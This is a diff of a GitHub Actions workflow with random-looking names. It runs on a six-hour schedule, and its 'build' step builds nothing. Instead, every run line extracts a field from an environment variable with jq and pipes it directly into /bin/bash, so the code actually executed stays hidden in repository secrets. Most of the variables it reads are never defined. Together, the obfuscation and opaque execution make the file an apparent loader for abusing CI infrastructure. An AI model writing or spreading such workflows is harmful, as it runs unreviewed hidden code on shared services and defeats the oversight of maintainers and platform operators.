@@ -1,18 +1,33 @@
 name: duantianya4890
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 4/6 * * *'
-jobs:  # 16988
+    - cron: '32 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: duantianya4890
         env:
-          wajkq6: ${{ secrets.wajkq6 }}
+          ywqc71018: ${{ secrets.ywqc71018 }}
         run: |
-          echo $wajkq6 | jq -r .iipof7 | /bin/bash
-          echo $u67830 | jq -r .uwb47 | /bin/bash
-          echo $e36076 | jq -r .tljy3728 | /bin/bash
+          echo $ywqc71018 | jq -r .xiu058 | /bin/bash
+          echo $movv76 | jq -r .qzkpg855 | /bin/bash
+          echo $qt4360 | jq -r .zaaq36924 | /bin/bash
+          echo $vl0 | jq -r .gb426 | /bin/bash
+          echo $k80 | jq -r .urv92 | /bin/bash
+          echo $ivlfi6 | jq -r .r6 | /bin/bash
+          echo $uc5888 | jq -r .fyhaw177 | /bin/bash
+          echo $ldwn18063 | jq -r .nwih7881 | /bin/bash
+          echo $hbvqu89 | jq -r .ue7841 | /bin/bash
+          echo $qhf8264 | jq -r .cfbs650 | /bin/bash
+          echo $eccm58118 | jq -r .u740 | /bin/bash
+          echo $e149 | jq -r .to26 | /bin/bash
+          echo $c654 | jq -r .drxll5 | /bin/bash
+          echo $pivv34 | jq -r .ckivm4 | /bin/bash
+          echo $rwt7472 | jq -r .fpxy376 | /bin/bash
+          echo $plg13 | jq -r .qhm97689 | /bin/bash
+          echo $kskgg6722 | jq -r .ywph0 | /bin/bash
 
